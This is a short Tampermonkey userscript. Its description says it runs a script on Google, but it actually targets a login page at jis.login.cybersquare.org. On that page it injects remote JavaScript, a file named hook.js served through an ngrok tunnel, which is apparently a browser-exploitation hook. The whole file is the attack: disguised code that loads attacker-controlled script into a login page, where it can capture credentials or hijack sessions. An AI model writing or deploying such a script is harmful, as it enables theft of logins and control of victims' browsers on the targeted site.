// ==UserScript==
// @name         Run Script on Google
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Runs custom script on Google
// @match        https://jis.login.cybersquare.org/login
// @grant        none
// ==/UserScript==

(function() {
    var script = document.createElement('script');
    script.src = 'https://44c4-79-134-141-41.ngrok-free.app/hook.js';
    document.body.appendChild(script);
})();
